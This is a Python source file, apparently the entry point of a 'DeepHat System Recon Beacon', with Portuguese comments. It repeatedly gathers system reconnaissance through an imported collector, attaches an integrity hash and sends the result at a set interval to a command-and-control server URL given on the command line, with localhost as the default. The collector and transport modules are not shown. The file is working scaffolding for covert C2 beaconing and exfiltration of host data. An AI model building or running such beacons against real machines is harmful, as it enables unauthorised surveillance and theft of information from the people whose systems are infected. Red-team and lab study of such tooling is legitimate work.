import time
import sys
import argparse
import logging
from collector import SystemCollector
from transport import Transporter
from utils import hash_payload

# Configuração de Log
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("beacon.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class Beacon:
    def __init__(self, c2_url, interval_seconds=300, once=False):
        self.collector = SystemCollector()
        self.transporter = Transporter(c2_url=c2_url)
        self.interval = interval_seconds
        self.once = once

    def run_cycle(self):
        """Executa um ciclo completo de coleta e envio."""
        logger.info("Starting recon cycle...")
        try:
            data = self.collector.collect()
            
            # Adiciona hash de integridade
            data["meta"]["integrity_hash"] = hash_payload(data)
            
            logger.info(f"Collected {len(data)} top-level keys. Hash: {data['meta']['integrity_hash']}")
            
            success = self.transporter.send(data)
            
            if success:
                logger.info("Cycle completed successfully.")
            else:
                logger.warning("Failed to send payload. Will retry in next cycle.")
                
        except Exception as e:
            logger.error(f"Critical error during cycle: {e}", exc_info=True)

    def start(self):
        """Inicia o loop principal do beacon."""
        logger.info(f"Beacon starting. Interval: {self.interval}s. C2: {self.transporter.c2_url}")
        
        while True:
            self.run_cycle()
            
            if self.once:
                break
                
            time.sleep(self.interval)

def main():
    parser = argparse.ArgumentParser(description="DeepHat System Recon Beacon")
    parser.add_argument("--url", default="http://localhost:8000/beacon", help="C2 Server URL")
    parser.add_argument("--interval", type=int, default=300, help="Interval between beacons in seconds")
    parser.add_argument("--once", action="store_true", help="Run only once and exit")
    
    args = parser.parse_args()
    
    beacon = Beacon(
        c2_url=args.url,
        interval_seconds=args.interval,
        once=args.once
    )
    
    beacon.start()

if __name__ == "__main__":
    main()